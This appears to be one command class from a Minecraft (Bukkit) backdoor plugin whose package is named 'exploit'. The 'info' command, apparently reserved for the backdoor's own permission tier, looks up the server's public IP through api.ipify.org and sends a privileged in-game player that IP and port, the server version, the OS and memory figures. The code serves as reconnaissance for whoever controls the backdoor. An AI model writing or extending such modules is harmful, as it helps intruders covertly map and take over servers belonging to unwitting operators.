package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

public class InfoCommand extends Command {
    public InfoCommand() { super(); }
    @Override public String getName() { return "info"; }
    @Override public String getDescription() { return "Shows information about the server."; }
    @Override public String getUsage() { return ""; }
    @Override public int getRequirePerm() { return 2; }
    @Override public void execute(Player sender, String[] args) {
        try {
            URL url = new URL("https://api.ipify.org/");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String ip = br.readLine();
            Runtime r = Runtime.getRuntime();
            long memUsed = (r.totalMemory() - r.freeMemory()) / 1048576L;
            long memMax = r.maxMemory() / 1048576L;
            Exploit.sender.sendMessage(sender, ChatColor.GRAY + "----------------------------------------------");
            Exploit.sender.sendMessage(sender, ChatColor.WHITE + "Server IP: " + ChatColor.GRAY + ip + ":" + Bukkit.getServer().getPort());
            Exploit.sender.sendMessage(sender, ChatColor.WHITE + "Server version: " + ChatColor.GRAY + Bukkit.getVersion());
            Exploit.sender.sendMessage(sender, ChatColor.WHITE + "OS: " + ChatColor.GRAY + System.getProperty("os.name"));
            Exploit.sender.sendMessage(sender, ChatColor.WHITE + "RAM (used/max): " + ChatColor.GRAY + memUsed + "MB / " + memMax + "MB");
            Exploit.sender.sendMessage(sender, ChatColor.GRAY + "----------------------------------------------");
        } catch (IOException e) {
            Exploit.sender.sendError(sender, "Error gathering system info.");
        }
    }
}